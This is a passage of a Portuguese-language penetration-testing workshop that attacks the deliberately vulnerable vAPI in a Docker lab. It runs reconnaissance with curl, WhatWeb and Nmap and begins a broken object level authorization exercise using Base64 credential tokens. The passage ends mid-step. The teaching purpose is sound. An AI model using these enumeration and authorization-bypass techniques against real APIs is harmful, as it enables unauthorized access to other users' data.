# Workshop 06: OWASP API Security Top 10 com vAPI

**Autor:** Charles Alandt

**Contato:** `echo "Y2hhcmxlcy5hbGFuZHRAZ21haWwuY29tCg==" | base64 -d`

**Uso e atribuicao:** este material pode ser copiado, adaptado e utilizado livremente para fins educacionais, desde que a fonte e o autor sejam referenciados.

---

> [!CAUTION]
> **AVISO DE ETICA E RESPONSABILIDADE**
> Este conteudo e ambiente foram elaborados exclusivamente para fins educacionais, laboratoriais e de pesquisa em ambiente controlado.
>
> **Uso estritamente proibido** em sistemas de terceiros, redes publicas ou redes de producao sem autorizacao formal. O uso deste material em qualquer contexto que viole normas legais, politicas corporativas ou limites do laboratorio e de inteira responsabilidade do executor.
>
> **DISCLAIMER DE ESTABILIDADE E SUPORTE:**
> Este laboratorio foi testado e validado pelo instrutor. No entanto, o ecossistema de TI (versoes de kernel, distribuicoes Linux, imagens Docker, versoes de aplicacoes vulneraveis e dependencias PHP/Laravel) evolui rapidamente.
>
> **Fique atento:**
> - A execucao e permitida apenas em laboratorio isolado (VM dedicada, Docker Lab, NAT/Host-Only ou rede segregada).
> - As tecnicas demonstradas envolvem reconhecimento de API, enumeracao de endpoints, exploracao de vulnerabilidades de autorizacao, autenticacao e exposicao de dados, devendo permanecer restritas ao escopo autorizado do laboratorio.
> - Ambientes de laboratorio sao sensiveis e dependentes de hardware, configuracao de rede, estado dos containers e versoes de pacotes.
> - Falhas podem ocorrer devido a containers parados, banco de dados nao inicializado, ausencia de ferramentas no container atacante ou conflitos de rede.
> - **Ajustes manuais podem ser necessarios** durante o processo para adequar o lab a sua maquina especifica.

---

## Indice

- [1. Contexto e Objetivo da Aula](#1-contexto-e-objetivo-da-aula)
- [2. Escopo Operacional](#2-escopo-operacional)
  - [Passo 2.1: Confirmar host, Docker e container atacante](#passo-21-confirmar-host-docker-e-container-atacante)
  - [Passo 2.2: Confirmar containers do vAPI ativos](#passo-22-confirmar-containers-do-vapi-ativos)
  - [Passo 2.3: Instalar e validar ferramentas no atacante_kali](#passo-23-instalar-e-validar-ferramentas-no-atacante_kali)
  - [Passo 2.4: Mapear alvo e criar diretorio de evidencias](#passo-24-mapear-alvo-e-criar-diretorio-de-evidencias)
- [3. Fase 1: O que e o OWASP API Security Top 10](#3-fase-1-o-que-e-o-owasp-api-security-top-10)
  - [3.1 Por que APIs sao diferentes de aplicacoes web tradicionais](#31-por-que-apis-sao-diferentes-de-aplicacoes-web-tradicionais)
  - [3.2 O OWASP API Top 10 — visao geral](#32-o-owasp-api-top-10--visao-geral)
  - [3.3 O que e o vAPI](#33-o-que-e-o-vapi)
  - [3.4 Autenticacao no vAPI: o cabecalho `Authorization-Token`](#34-autenticacao-no-vapi-o-cabecalho-authorization-token)
- [4. Fase 2: Reconhecimento e Mapeamento da API](#4-fase-2-reconhecimento-e-mapeamento-da-api)
  - [Passo 4.1: Confirmar que o vAPI responde](#passo-41-confirmar-que-o-vapi-responde)
  - [Passo 4.2: Enumerar endpoints com curl](#passo-42-enumerar-endpoints-com-curl)
  - [Passo 4.3: Fingerprint da API com WhatWeb e Nmap](#passo-43-fingerprint-da-api-com-whatweb-e-nmap)
- [5. Fase 3: API1 — Broken Object Level Authorization](#5-fase-3-api1--broken-object-level-authorization)
  - [Passo 5.1: Criar usuario e gerar o Authorization-Token](#passo-51-criar-usuario-e-gerar-o-authorization-token)
  - [Passo 5.2: Acessar objeto proprio](#passo-52-acessar-objeto-proprio)
  - [Passo 5.3: Acessar objeto de outro usuario — Broken Object Level Authorization](#passo-53-acessar-objeto-de-outro-usuario--broken-object-level-authorization)
  - [Passo 5.4: Enumerar todos os IDs — impacto](#passo-54-enumerar-todos-os-ids--impacto)
- [6. Fase 4: API2 — Broken Authentication](#6-fase-4-api2--broken-authentication)
  - [Passo 6.1: Identificar endpoint de autenticacao](#passo-61-identificar-endpoint-de-autenticacao)
  - [Passo 6.2: Credential Stuffing com lista de senhas](#passo-62-credential-stuffing-com-lista-de-senhas)
  - [Passo 6.3: Analisar ausencia de rate limiting](#passo-63-analisar-ausencia-de-rate-limiting)
  - [Passo 6.4: Interpretar impacto e evidencia](#passo-64-interpretar-impacto-e-evidencia)
- [7. Fase 5: API3 — Broken Object Property Level Authorization (Excessive Data Exposure)](#7-fase-5-api3--broken-object-property-level-authorization-excessive-data-exposure)
  - [Passo 7.1: Requisitar recurso e analisar resposta completa](#passo-71-requisitar-recurso-e-analisar-resposta-completa)
  - [Passo 7.2: Extrair campos sensiveis com jq](#passo-72-extrair-campos-sensiveis-com-jq)
  - [Passo 7.3: Interpretar impacto e evidencia](#passo-73-interpretar-impacto-e-evidencia)
- [8. Fase 6: API5 — Broken Function Level Authorization](#8-fase-6-api5--broken-function-level-authorization)
  - [Passo 8.1: Identificar endpoint administrativo sem autenticacao](#passo-81-identificar-endpoint-administrativo-sem-autenticacao)
  - [Passo 8.2: Criar usuario comum e acessar a funcao "admin"](#passo-82-criar-usuario-comum-e-acessar-a-funcao-admin)
  - [Passo 8.3: Interpretar impacto e evidencia](#passo-83-interpretar-impacto-e-evidencia)
- [9. Mitigacao, Deteccao e Hardening](#9-mitigacao-deteccao-e-hardening)
- [10. Encerramento](#10-encerramento)
  - [10.1 Modelo minimo de relatorio do aluno](#101-modelo-minimo-de-relatorio-do-aluno)
  - [10.2 Sintese final do workshop](#102-sintese-final-do-workshop)
- [11. Referencias](#11-referencias)

---

## 1. Contexto e Objetivo da Aula

Nos workshops anteriores, exploramos reconhecimento de rede (Workshop 02), scripts NSE e aplicacoes web (Workshop 03), DAST com OWASP ZAP (Workshop 04) e scanners CLI como Nikto, Amass e Uniscan (Workshop 05). Em todos eles, o alvo principal foi uma **aplicacao web tradicional** — o DVWA ou o Juice Shop.

Neste workshop, o foco muda: trabalhamos exclusivamente com **APIs REST**. APIs sao a espinha dorsal de sistemas modernos — aplicativos moveis, SPAs, integrações entre servicos e arquiteturas de microsservicos todas dependem de APIs. Por isso, o OWASP publicou, em 2019 e revisou em 2023, uma lista dedicada: o **OWASP API Security Top 10**.

O alvo deste workshop e o **vAPI** (Vulnerable Adversely Programmed Interface) — uma API Laravel/PHP propositalmente vulneravel, que simula cada categoria do OWASP API Top 10 como exercicio pratico. Ele ja esta rodando no nosso ambiente Docker como `lab_vapi_www`.

A narrativa deste laboratorio parte de uma situacao comum em testes de seguranca: ja sabemos que existe uma API vulneravel no ambiente, mas ainda precisamos provar **como** ela falha, **qual evidencia tecnica sustenta o achado** e **qual controle deveria impedir o abuso**. Por isso, vamos sair do reconhecimento basico, entender o modelo de autenticacao da aplicacao, criar identidades de teste e demonstrar falhas de autorizacao, autenticacao e exposicao de dados com comandos reproduziveis.

**Ao final desta aula, vamos conseguir:**

- Compreender por que APIs exigem uma abordagem de teste diferente de aplicacoes web.
- Mapear e enumerar endpoints de uma API REST desconhecida.
- Explorar de forma controlada: Broken Object Level Authorization (API1), Broken Authentication (API2), Excessive Data Exposure (API3) e Broken Function Level Authorization (API5).
- Registrar evidencias no padrao academico.
- Discutir mitigacoes tecnicas para cada categoria explorada.

---

## 2. Escopo Operacional

Este workshop assume que o ambiente Docker do laboratorio esta ativo no host `srvdocker01` e que o container `atacante_kali` esta na rede `docker_lab_vulneravel`. O vAPI consiste em dois containers: `lab_vapi_www` (aplicacao PHP/Laravel) e `lab_vapi_db` (banco MySQL).

No ambiente validado para esta aula, foram observados:

- Host Docker: `srvdocker01`
- Rede Docker vulneravel: `docker_lab_vulneravel`
- Subrede Docker: `172.18.0.0/16`
- Container atacante: `atacante_kali` — `172.18.0.21`
- Container alvo (app): `lab_vapi_www` — `172.18.0.40`
- Container alvo (banco): `lab_vapi_db` — `172.18.0.41`
- Porta da API: `80/tcp` (interna), publicada no host como `0.0.0.0:8000->80/tcp`
- Porta do banco: `3306/tcp` (interna), publicada no host como `0.0.0.0:3307->3306/tcp`

> **Observacao:** os IPs podem variar conforme o estado da rede Docker. Sempre descubra os IPs reais antes de comecar (veja Passo 2.2).

Tambem e importante separar **escopo documentado** de **comportamento observado no laboratorio**. O vAPI organiza os desafios por modulo (`api1`, `api2`, `api3`, etc.), mas a forma exata de chamar cada etapa foi validada na pratica durante a aula: alguns modulos usam `GET` com `Authorization-Token`, outros usam `POST` com JSON, e alguns endpoints respondem sem autenticacao. Por isso, este workshop nao parte de uma varredura cega em todos os caminhos possiveis; ele usa rotas e metodos confirmados no ambiente para demonstrar, com evidencia, as falhas que queremos estudar.

### Passo 2.1: Confirmar host, Docker e container atacante

```bash
pwd
hostname
whoami
id
docker version --format '{{.Server.Version}}'
```

**Output validado no laboratorio:**

```text
/root
srvdocker01
root
uid=0(root) gid=0(root) groups=0(root)
29.4.3
```

**Componentes dos comandos:**

- `pwd`: diretorio atual de trabalho.
- `hostname`: nome do host onde estamos executando.
- `whoami` e `id`: usuario efetivo e grupos. Confirma acesso ao grupo `docker`.
- `docker version`: confirma que o daemon esta acessivel.

**Resultado esperado:** host `srvdocker01`, usuario com grupo `docker` ou `root`, daemon respondendo.

**Analise:** antes de qualquer acao ofensiva, confirme seu contexto de execucao. Um comando executado no host tem visibilidade diferente de um executado dentro do container `atacante_kali`. Essa distincao e parte da evidencia e parte da metodologia.

### Passo 2.2: Confirmar containers do vAPI ativos

```bash
docker ps --format 'table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}' | grep -E "vapi|NAMES"
```

**Flags utilizadas:**

- `--format`: saida customizada em tabela.
- `grep -E "vapi|NAMES"`: filtra apenas containers relacionados ao vAPI e o cabecalho.

**Resultado esperado (exemplo; tempo de execucao e portas publicadas podem variar):**

```text
NAMES           IMAGE                   STATUS          PORTS
lab_vapi_www    docker-vapi-www         Up X hours      0.0.0.0:8000->80/tcp
lab_vapi_db     mysql:8.0               Up X hours      33060/tcp, 0.0.0.0:3307->3306/tcp
```

**Analise:** confirme que ambos os containers estao em estado `Up`. Se `lab_vapi_db` estiver parado ou em `Restarting`, o banco nao esta disponivel e as requisicoes da API poderao retornar erro 500. Nesse caso, interrompa a validacao, confirme o estado do laboratorio e reative os containers conforme o procedimento oficial de subida do ambiente usado na turma.

**Descobrir IPs reais dos containers:**

```bash
docker inspect -f '{{.Name}} -> {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \
  lab_vapi_www lab_vapi_db
```

**Componentes do comando:**

- `docker inspect`: inspeciona metadados do container.
- `-f '...'`: formata a saida com Go template.
- `{{.Name}}`: nome do container.
- `{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}`: itera sobre redes e imprime o IP de cada uma.

**Resultado esperado (exemplo; os IPs podem variar conforme a rede Docker do laboratorio):**

```text
/lab_vapi_www -> 172.18.0.40
/lab_vapi_db  -> 172.18.0.41
```

> Anote esses IPs. Eles serao usados em todos os passos seguintes. Se diferirem dos valores do workshop, substitua nos comandos.

### Passo 2.3: Instalar e validar ferramentas no atacante_kali

```bash
docker exec atacante_kali sh -lc '
  apt-get update -qq &&
  apt-get install -y -qq curl jq ffuf 2>/dev/null &&
  echo "--- versoes ---" &&
  curl --version | head -1 &&
  jq --version &&
  ffuf -V
'
```

**Ferramentas instaladas:**

| Ferramenta | Funcao neste workshop |
|---|---|
| `curl` | Requisicoes HTTP manuais contra a API |
| `jq` | Formatar e filtrar respostas JSON |
| `ffuf` | Fuzzing de endpoints e parametros da API |

**Analise:** em workshops anteriores usamos `nikto`, `amass` e `uniscan` para aplicacoes web. Para APIs REST, o conjunto muda: `curl` e `jq` sao o par fundamental para validacao manual, e `ffuf` substitui `dirb` para descoberta de rotas de API.

### Passo 2.4: Mapear alvo e criar diretorio de evidencias

```bash
docker exec atacante_kali sh -lc '
  mkdir -p /tmp/evidencias/workshop-06 &&
  echo "Alvo: lab_vapi_www" > /tmp/evidencias/workshop-06/escopo.txt &&
  echo "IP: 172.18.0.40"  >> /tmp/evidencias/workshop-06/escopo.txt &&
  echo "Data: $(date)"    >> /tmp/evidencias/workshop-06/escopo.txt &&
  cat /tmp/evidencias/workshop-06/escopo.txt
'
```

**Analise:** criar o diretorio de evidencias antes de comecar e um habito profissional. Todo comando executado a partir daqui deve ter sua saida redirecionada para esse diretorio com `| tee /tmp/evidencias/workshop-06/<nome>.txt`.

---

## 3. Fase 1: O que e o OWASP API Security Top 10

### 3.1 Por que APIs sao diferentes de aplicacoes web tradicionais

Nos workshops anteriores, o OWASP ZAP e o Nikto realizavam **spidering**: navegavam por paginas HTML, identificavam formularios e parametros e testavam entradas. Spidering e o processo de seguir links, formularios e recursos referenciados por uma aplicacao para construir um mapa da superficie exposta. Isso funciona bem para aplicacoes que renderizam HTML no servidor.

APIs REST sao diferentes:

| Caracteristica | Aplicacao Web Tradicional | API REST |
|---|---|---|
| Interface principal | HTML + formularios | JSON sobre HTTP |
| Descoberta de superficie | Spider (links HTML) | Documentacao, fuzzing, interceptacao |
| Autenticacao tipica | Cookie de sessao | Token JWT, API Key, OAuth |
| Dados retornados | HTML renderizado | JSON com todos os campos do objeto |
| Controle de acesso | Por sessao e pagina | Por endpoint, metodo HTTP e objeto |
| Principal risco | XSS, CSRF, SQLi | Broken Object Level Authorization, Broken Auth, Excessive Data Exposure |

Essa diferenca explica por que scanners como Nikto e OpenVAS tem retorno limitado contra APIs: eles nao entendem a logica de negocio, nao sabem quais IDs sao validos e nao conseguem inferir a relacao entre tokens e recursos.

### 3.2 O OWASP API Top 10 — visao geral

O OWASP API Security Top 10 (2023) lista as categorias de vulnerabilidade mais criticas em APIs. Ate esta revisao do material, em junho de 2026, a edicao publica estavel mais recente mantida pela OWASP para API Security Top 10 e a de **2023**; a edicao anterior relevante e a de 2019. Se uma nova edicao oficial for publicada, esta tabela deve ser revisada antes de reutilizar o workshop em uma nova turma.

| # | Categoria | Descricao resumida |
|---|---|---|
| **API1** | Broken Object Level Authorization | Acessar objetos de outros usuarios alterando o ID na requisicao |
| **API2** | Broken Authentication | Autenticacao fraca, sem rate limiting, tokens previsiveis |
| **API3** | Broken Object Property Level Authorization | API retorna mais campos do que o necessario (antes: Excessive Data Exposure) |
| **API4** | Unrestricted Resource Consumption | Sem limites de tamanho, rate, paginacao ou concorrencia |
| **API5** | Broken Function Level Authorization | Usuario comum acessa funcoes administrativas |
| **API6** | Unrestricted Access to Sensitive Business Flows | Automacao de fluxos de negocio (compra, voto, reserva) sem controle |
| **API7** | Server Side Request Forgery (SSRF) | API busca URL fornecida pelo usuario e pode acessar recursos internos |
| **API8** | Security Misconfiguration | Headers ausentes, CORS aberto, debug ativo, erros expostos |
| **API9** | Improper Inventory Management | Versoes antigas de API em producao, endpoints nao documentados |
| **API10** | Unsafe Consumption of APIs | Confiar cegamente em APIs de terceiros sem validacao |

Neste workshop, exploraremos na pratica: **API1, API2, API3 e API5**.

### 3.3 O que e o vAPI

O **vAPI** (Vulnerable Adversely Programmed Interface) e um projeto open-source criado por Tushar Kulkarni e apresentado no OWASP 20th Anniversary, Black Hat Europe 2021 Arsenal e HITB Cyberweek 2021. E uma API Laravel/PHP que implementa propositalmente cada categoria do OWASP API Top 10 como exercicio separado.

No nosso laboratorio, o vAPI roda como `lab_vapi_www` (PHP/Laravel) com banco `lab_vapi_db` (MySQL). A API aceita requisicoes em `http://172.18.0.40/vapi/` e retorna respostas JSON.

Cada endpoint do vAPI corresponde a uma categoria:

| Endpoint | Categoria OWASP API |
|---|---|
| `/vapi/api1/` | API1 — Broken Object Level Authorization |
| `/vapi/api2/` | API2 — Broken Authentication |
| `/vapi/api3/` | API3 — Excessive Data Exposure |
| `/vapi/api4/` | API4 — Lack of Resources & Rate Limiting |
| `/vapi/api5/` | API5 — Broken Function Level Authorization |
| `/vapi/api6/` | API6 — Mass Assignment |
| `/vapi/api7/` | API7 — Security Misconfiguration |
| `/vapi/api8/` | API8 — Injection |
| `/vapi/api9/` | API9 — Improper Assets Management |
| `/vapi/api10/` | API10 — Insufficient Logging & Monitoring |

### 3.4 Autenticacao no vAPI: o cabecalho `Authorization-Token`

Diferente do padrao "Token JWT, API Key, OAuth" da tabela da secao 3.1, esta build do vAPI usa uma classe de autenticacao customizada (`App\CustomClasses\CustomHeaderAuth`). Nos modulos **API1** e **API5** nao existe rota de login: o cliente envia um cabecalho

```text
Authorization-Token: <base64("usuario:senha")>
```

O backend decodifica o Base64 e compara a senha em **texto puro** contra o banco. Nao ha JWT, nao ha assinatura, nao ha expiracao — o "token" equivale a enviar usuario e senha em toda requisicao, apenas ofuscados em Base64 (qualquer pessoa pode decodificar com `base64 -d`).

Por que o vAPI usa esse modelo? Nao e uma recomendacao moderna de arquitetura. E uma escolha propositalmente simples e didatica para demonstrar dois pontos: primeiro, que codificacao Base64 nao e criptografia; segundo, que "estar autenticado" nao significa automaticamente "estar autorizado" a acessar qualquer objeto ou funcao. Esse padrao tambem lembra integracoes legadas e APIs internas antigas que usavam cabecalhos customizados ou credenciais reaproveitadas em cada requisicao, antes da popularizacao de fluxos mais robustos com OAuth2, JWT assinado, expiracao de token e escopos de permissao.

Ja o modulo **API2** tem uma rota `/api2/user/login` que, em caso de sucesso, retorna um `token` — uma string aleatoria opaca (tambem **nao** e JWT) — a ser enviado no mesmo cabecalho `Authorization-Token` nas chamadas seguintes.

Tenha isso em mente ao planejar os comandos das Fases 3, 4 e 6: `Authorization: Bearer <token>` **nao se aplica** a este build do vAPI.

---

## 4. Fase 2: Reconhecimento e Mapeamento da API

### Passo 4.1: Confirmar que o vAPI responde

```bash
docker exec atacante_kali sh -lc '
  echo "=== HEAD no vAPI ===" &&
  curl -si http://172.18.0.40/vapi/ | head -20 | tee /tmp/evidencias/workshop-06/01-vapi-head.txt
'
```

**Flags do curl utilizadas:**

- `-s`: modo silencioso (sem barra de progresso).
- `-i`: inclui cabecalhos HTTP na saida.

**Resultado esperado (exemplo; data, cookies e identificadores de sessao podem variar):**

```text
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2026 03:10:09 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Cache-Control: no-cache, private
Content-Type: text/html; charset=UTF-8
Set-Cookie: XSRF-TOKEN=...
Set-Cookie: laravel_session=...
```

**Analise:** mesmo sem executar nenhum teste, os cabecalhos ja entregam informacoes criticas:

- `X-Powered-By: PHP/7.4.33`: versao exposta do PHP — a serie 7.4 atingiu **End-of-Life em 28/11/2022** e nao recebe mais patches de seguranca oficiais. Expor a versao facilita a busca por CVEs conhecidas do runtime.
- **Ausencia do cabecalho `Server`**: diferente do que se esperaria de um Apache/Nginx tradicional, este `X-Powered-By` sozinho ja entrega a stack (PHP). A ausencia do `Server` nao e "hardening" deliberado — e reflexo de como a imagem customizada do vAPI serve a aplicacao.
- `Set-Cookie: XSRF-TOKEN=...` e `Set-Cookie: laravel_session=...`: a API emite cookies de sessao do Laravel mesmo em uma rota "REST". Isso indica que a aplicacao mistura sessao baseada em cookie com autenticacao por token (ver Fases 3 e 6) — uma superficie extra a considerar.
- Ausencia de `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options`, `Strict-Transport-Security`: confirma **API8 — Security Misconfiguration**.

### Passo 4.2: Enumerar endpoints com curl

Na validacao do laboratorio, observamos que cada modulo do vAPI expõe rotas e metodos diferentes — nao existe um sub-recurso `/user/` generico que responda corretamente em todos eles. Em vez de um loop generico (que retornaria majoritariamente `500` por rota/metodo incompativel), vamos sondar diretamente as quatro rotas que serao exploradas nas proximas fases. Cada resposta ja antecipa o tipo de falha que veremos:

```bash
docker exec atacante_kali sh -lc '
  mkdir -p /tmp/evidencias/workshop-06
  VAPI="http://172.18.0.40/vapi"
  {
    echo "--- API1: GET /api1/user/1 (sem auth) ---"
    curl -s -o /tmp/api1.json -w "HTTP %{http_code}\n" $VAPI/api1/user/1 && cat /tmp/api1.json && echo
    echo "--- API2: POST /api2/user/login (credenciais invalidas) ---"
    curl -s -o /tmp/api2.json -w "HTTP %{http_code}\n" -X POST $VAPI/api2/user/login \
      -H "Content-Type: application/json" -d "{\"email\":\"teste@teste.com\",\"password\":\"errada\"}" && cat /tmp/api2.json && echo
    echo "--- API3: GET /api3/comment (sem auth) ---"
    curl -s -o /tmp/api3.json -w "HTTP %{http_code}\n" $VAPI/api3/comment && cat /tmp/api3.json && echo
    echo "--- API5: GET /api5/users (sem auth) ---"
    curl -s -o /tmp/api5.json -w "HTTP %{http_code}\n" $VAPI/api5/users && cat /tmp/api5.json && echo
  } | tee /tmp/evidencias/workshop-06/02-enum-endpoints.txt
'
```

**Componentes do comando:**

- `-o /tmp/apiN.json -w "HTTP %{http_code}\n"`: salva o corpo da resposta em arquivo e imprime o codigo HTTP em uma linha separada, evitando misturar status com JSON.
- Cada chamada usa o metodo e o payload minimo exigido pela rota correspondente (descobertos via `routes/api.php` da aplicacao).

**Resultado esperado:**

```text
--- API1: GET /api1/user/1 (sem auth) ---
HTTP 403
{"success":"false","cause":"authHeaderNotSet"}
--- API2: POST /api2/user/login (credenciais invalidas) ---
HTTP 401
{"success":"false","cause":"usernameOrPasswordIncorrect"}
--- API3: GET /api3/comment (sem auth) ---
HTTP 200
[{"id":1,"postid":"1","deviceid":"flag{api3_...}","latitude":"45.5426274","longitude":"-122.7944111","commenttext":"THIS POST IS SH***Y","username":"baduser007"}]
--- API5: GET /api5/users (sem auth) ---
HTTP 403
{"success":"false","cause":"authHeaderNotSet"}
```

**Analise:** ja nesta sondagem aparecem os tres padroes que vamos explorar nas proximas fases:

- **API1 e API5 retornam `403` com `"cause":"authHeaderNotSet"`** quando o cabecalho `Authorization-Token` esta ausente. Isso mostra que a API *exige* autenticacao nessas rotas — mas, como veremos, a verificacao se limita a "o cabecalho existe e as credenciais sao validas?", sem checar se o usuario tem permissao sobre o **objeto** (API1) ou a **funcao** (API5) solicitada.
- **API2 retorna `401` com `"cause":"usernameOrPasswordIncorrect"`** para um login invalido. A mensagem nao distingue usuario inexistente de senha errada (positivo), mas nada na resposta sugere limite de tentativas — ponto que validaremos na Fase 4.
- **API3 retorna `200` sem nenhuma autenticacao** e ja expoe o conteudo completo do recurso `comment`, incluindo um campo `deviceid` que sera nosso alvo na Fase 5.

Diferente de um scanner generico, esta sondagem direcionada usa a rota/metodo corretos de cada modulo e ja revela, antes de qualquer exploracao, a logica real de autenticacao da aplicacao.

### Passo 4.3: Fingerprint da API com WhatWeb e Nmap

```bash
docker exec atacante_kali sh -lc '
  echo "=== WhatWeb ===" &&
  whatweb http://172.18.0.40/vapi/ --log-brief=/tmp/evidencias/workshop-06/03-whatweb.txt &&
  cat /tmp/evidencias/workshop-06/03-whatweb.txt
'
```

```bash
docker exec atacante_kali sh -lc '
  echo "=== Nmap servico e scripts HTTP ===" &&
  nmap -sV -p 80 --script http-title,http-headers,http-methods 172.18.0.40 \
    -oN /tmp/evidencias/workshop-06/04-nmap-vapi.txt &&
  cat /tmp/evidencias/workshop-06/04-nmap-vapi.txt
'
```

**Flags Nmap utilizadas:**

- `-sV`: detecta versao dos servicos.
- `-p 80`: foca na porta 80.
- `--script http-title,http-headers,http-methods`: scripts NSE que coletam titulo, cabecalhos e metodos HTTP permitidos.
- `-oN`: salva saida em formato texto normal.

**Resultado esperado (WhatWeb):**

```text
http://172.18.0.40/vapi/ [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ],
Email[user@example.com], HTML5, HttpOnly[laravel_session], IP[172.18.0.40], Laravel, PHP[7.4.33],
PoweredBy[ReDoc], Script, Title[vAPI], X-Powered-By[PHP/7.4.33]
```

**Resultado esperado (Nmap, resumido):**

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    (PHP 7.4.33)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: vAPI
| http-headers:
|   X-Powered-By: PHP/7.4.33
|   Set-Cookie: XSRF-TOKEN=...
|   Set-Cookie: laravel_session=...
|_  (Request type: HEAD)
```

**Analise:**

- O WhatWeb confirma em uma unica linha o que os cabecalhos ja sugeriam — **Laravel** + **PHP 7.4.33** — e ainda identifica `PoweredBy[ReDoc]`, indicio de que existe (ou existiu) documentacao OpenAPI/Swagger via ReDoc na aplicacao, um possivel alvo de **API9 — Improper Inventory Management**.
- O Nmap confirma a versao do PHP via fingerprint do servico (`VERSION: (PHP 7.4.33)`) sem qualquer autenticacao.
- A ausencia de `X-Frame-Options`, `Content-Security-Policy`, `X-Content-Type-Options` e `Strict-Transport-Security` reforca um achado de **API8 — Security Misconfiguration**. Em APIs puras, alguns desses cabecalhos parecem "coisa de navegador", mas ainda importam quando a API convive com documentacao web, painel administrativo, cookies de sessao, ReDoc/Swagger ou consumo por SPAs. `X-Frame-Options` reduz risco de clickjacking em interfaces expostas; `Content-Security-Policy` limita execucao/carregamento indevido de scripts em superficies web associadas; `X-Content-Type-Options: nosniff` evita interpretacao ambigua de conteudo; e `Strict-Transport-Security` força uso consistente de HTTPS em ambientes reais. A ausencia desses controles nao prova exploracao imediata, mas evidencia uma postura fraca de hardening HTTP.
- `http-methods` retornou apenas `GET HEAD POST OPTIONS` para a raiz `/vapi/`. Isso **nao significa** que rotas especificas (como `/api1/user/{id}`) nao aceitem outros verbos — cada rota Laravel define seus proprios metodos, e o probe `OPTIONS` na raiz tem visibilidade limitada. Vale testar `OPTIONS`, `PUT` e `DELETE` diretamente nos endpoints de interesse durante as Fases 3-6.
- O `fingerprint-strings` do Nmap revela um detalhe extra: uma requisicao para um caminho inexistente (`FourOhFourRequest`) retorna `HTTP/1.0 500 Internal Server Error` com corpo `{}` — ou seja, **rotas nao mapeadas geram erro 500 em vez de 404**, comportamento que ja apareceu na sondagem do Passo 4.2 e que reaparecera nas proximas fases.

---

## 5. Fase 3: API1 — Broken Object Level Authorization

### O que e Broken Object Level Authorization

Broken Object Level Authorization, frequentemente abreviado como **BOLA** e anteriormente associado ao termo IDOR (Insecure Direct Object Reference), e uma das vulnerabilidades mais prevalentes em APIs segundo o OWASP. Ocorre quando a API aceita um ID de objeto na requisicao e retorna ou modifica esse objeto **sem verificar se o usuario autenticado tem permissao** para acessar aquele ID especifico. A partir deste ponto, usaremos a sigla BOLA apenas depois desta definicao completa.

**Exemplo conceitual:**
```
GET /vapi/api1/user/1  -> retorna dados do usuario 1 (seu proprio registro)
GET /vapi/api1/user/2  -> retorna dados do usuario 2 (pertence a outro usuario)
```
Se a segunda requisicao funciona, a API tem BOLA.

### Passo 5.1: Criar usuario e gerar o Authorization-Token

Antes de seguir, um ponto importante: **este build do vAPI nao usa JWT/Bearer e nao possui rota de login em API1**. A autenticacao e feita por um cabecalho customizado, `Authorization-Token`, cujo valor e `base64("username:password")` — as credenciais em texto puro, apenas codificadas (nao criptografadas) em Base64. O backend (`App\CustomClasses\CustomHeaderAuth`) decodifica esse valor e compara a senha em texto puro contra o banco.

**Observacao:** criar um usuario nao e, por si so, a vulnerabilidade desta fase. Esta etapa prepara uma identidade comum e controlada para que possamos testar, nos passos seguintes, se a API diferencia corretamente "usuario autenticado" de "usuario autorizado a acessar determinado objeto".

Primeiro, criamos um usuario de teste:

```bash
docker exec atacante_kali sh -lc '
  USER_API1="estudante1_$(date +%s)"
  PASS_API1="Pass123!"
  echo "=== API1: Criando usuario de teste ==="
  RESP=$(curl -s -X POST http://172.18.0.40/vapi/api1/user \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"Estudante Um\",\"username\":\"$USER_API1\",\"password\":\"$PASS_API1\",\"course\":\"Pentest\"}")
  echo "$RESP" | tee /tmp/evidencias/workshop-06/05-api1-create-user.txt
  ID_API1=$(echo "$RESP" | jq -r ".id")
  TOKEN_API1=$(printf "%s" "$USER_API1:$PASS_API1" | base64)
  {
    echo "USER_API1=$USER_API1"
    echo "ID_API1=$ID_API1"
    echo "TOKEN_API1=$TOKEN_API1"
  } | tee /tmp/evidencias/workshop-06/api1-contexto.env
'
```

**Flags do curl utilizadas:**

- `-X POST`: define o metodo HTTP como POST.
- `-H "Content-Type: application/json"`: informa ao servidor que o corpo e JSON.
- `-d '...'`: corpo da requisicao — o modelo `API1Users` exige `name`, `username`, `password` e `course`.

**Resultado esperado (exemplo; timestamp, token e `id` podem variar conforme a execucao):**

```text
{"name":"Estudante Um","username":"estudante1_1781480000","course":"Pentest","id":8}
USER_API1=estudante1_1781480000
ID_API1=8
TOKEN_API1=ZXN0dWRhbnRlMV8xNzgxNDgwMDAwOlBhc3MxMjMh
```

**Analise:** o username recebe um sufixo com `date +%s` para evitar conflito caso a aula seja executada mais de uma vez. O arquivo `api1-contexto.env` guarda o usuario, o ID real retornado pela API e o token calculado. Como o token e apenas `base64("username:password")`, qualquer credencial valida — incluindo a que acabamos de criar — produz um valor aceito pela API. Ele nao expira, nao e assinado e nao tem relacao com sessao; e literalmente a credencial ofuscada em Base64.

### Passo 5.2: Acessar objeto proprio

```bash
docker exec atacante_kali sh -lc '
  . /tmp/evidencias/workshop-06/api1-contexto.env
  echo "=== API1: Acessando MEUS dados (ID $ID_API1) ===" &&
  curl -s http://172.18.0.40/vapi/api1/user/$ID_API1 \
    -H "Authorization-Token: $TOKEN_API1" \
    | tee /tmp/evidencias/workshop-06/07-api1-meu-objeto.txt
'
```

**Resultado esperado (exemplo; use o `ID_API1` real gravado em `api1-contexto.env`):**

```json
{"id":8,"username":"estudante1_1781480000","name":"Estudante Um","course":"Pentest"}
```

**Analise:** esse e o comportamento **esperado e correto** — um usuario autenticado acessa seu proprio registro pelo `id` correto. Guarde esse formato de resposta (`id`, `username`, `name`, `course`); ele sera a base de comparacao para o proximo passo.

### Passo 5.3: Acessar objeto de outro usuario — Broken Object Level Authorization

Agora o teste decisivo: usamos o **mesmo token** do usuario criado no Passo 5.1, mas trocamos o `id` na URL para `1` — um dos usuarios "seed":

```bash
docker exec atacante_kali sh -lc '
  . /tmp/evidencias/workshop-06/api1-contexto.env
